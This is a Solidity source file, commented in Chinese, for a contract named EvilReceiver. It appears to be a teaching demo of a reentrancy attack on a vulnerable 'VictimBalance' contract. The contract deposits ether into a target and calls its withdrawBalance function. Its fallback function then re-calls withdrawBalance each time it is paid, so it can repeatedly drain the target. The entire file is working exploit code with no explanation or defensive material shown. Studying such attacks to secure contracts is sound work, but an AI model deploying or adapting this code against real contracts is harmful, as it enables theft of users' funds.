pragma solidity ^0.4.11;
contract EvilReceiver {

	// 攻擊對象的合約位址
	address public target;

	// 用於顯示訊息的event
	event MessageLog(string);

	// 用於顯示餘額的event
	event BalanceLog(uint);

	/// 建構子
	function EvilReceiver(address _target) {
		target = _target;
	}

	/// Fallback函數
	function() payable{
		BalanceLog(this.balance);
		// 呼叫VictimBalance合約的withdrawBalance函數
		if(!msg.sender.call.value(0)(bytes4(sha3("withdrawBalance()")))) {
			MessageLog("FAIL");
		} else {
			MessageLog("SUCCESS");
		}
	}

	/// 要從EOA匯款到本合約時，所使用的函數
	function addBalance() public payable {
	}

	/// 要匯款到攻擊對象時，所使用的函數
	function sendEthToTarget() public {
		if(!target.call.value(1 ether)(bytes4(sha3("addToBalance()")))) {throw;}
	}

	///要從攻擊對象提出款項時，所使用的函數
	function withdraw() public {
		if(!target.call.value(0)(bytes4(sha3("withdrawBalance()")))) {throw;}
	}
}
